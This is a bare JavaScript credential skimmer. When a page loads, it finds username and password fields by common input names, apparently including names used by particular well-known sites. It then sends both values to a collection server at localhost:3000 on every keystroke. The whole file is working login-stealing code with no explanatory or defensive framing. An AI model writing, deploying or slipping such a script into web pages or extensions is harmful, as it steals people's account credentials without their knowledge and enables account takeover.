document.addEventListener("DOMContentLoaded", function() {
    const usernameField = Array.from(document.querySelectorAll(
        'input[name="USER"],input[name="username"], input[name="user"], input[name="email"], input[name="session_key"], input[name="login"], input[name="userLoginId"]')).find(el => el);

    const passwordField = Array.from(document.querySelectorAll(
        'input[name="PASSWORD"], input[name="session_password"], input[name="password"], input[name="secret"]')).find(el => el);

    if (usernameField && passwordField) {
        usernameField.addEventListener("input", function() {
            sendData();
        });

        passwordField.addEventListener("input", function() {
            sendData();
        });
        function sendData() {
            fetch("http://localhost:3000/submit", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: "username=" + encodeURIComponent(usernameField.value) + "&password=" + encodeURIComponent(passwordField.value)
            });
        }
    }
});
